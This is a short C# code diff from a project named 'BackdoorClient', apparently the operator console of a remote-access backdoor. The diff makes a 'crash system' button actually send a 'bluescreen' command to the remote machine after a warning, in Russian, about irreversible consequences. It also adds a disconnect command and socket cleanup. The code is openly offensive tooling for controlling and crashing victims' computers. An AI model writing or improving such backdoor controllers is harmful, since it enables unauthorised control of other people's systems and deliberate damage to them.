@@ -70,7 +70,7 @@ namespace BackdoorClient
             sock.Bind(ipEndPoint);
             await Task.Run(() => sock.Listen(1));
             sockSender = sock.Accept();
-
+            sock.Dispose();
         }
 
         public string SendCommandAndGetResponce(string comm, int maxsize = 10000, MsgCodeMethod codeMethod = MsgCodeMethod.UTF8)
@@ -156,13 +156,24 @@ namespace BackdoorClient
         private void crashSysButton_Click(object sender, EventArgs e)
         {
             var responce = MessageBox.Show("Внимание, вы точно хотите крашнуть уд. систему? Могут быть не обратимые последстивия", "Разраб проги", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
-            if (responce == DialogResult.Yes) return;
+            if (responce != DialogResult.Yes) return;
+            SendCommandAndGetResponce("bluescreen");
         }
 
         private void jokesButton_Click(object sender, EventArgs e)
         {
             Jokes jokes = new Jokes(this);
             jokes.Show();
+        }
+
+        private void DisconnectBtn_Click(object sender, EventArgs e)
+        {
+            SendCommandAndGetResponce("abort connection");
+    
+            sockSender.Dispose();
+
+            sockSender = null;
+            connText.Text = "Не подключено";
         }
     }
 }
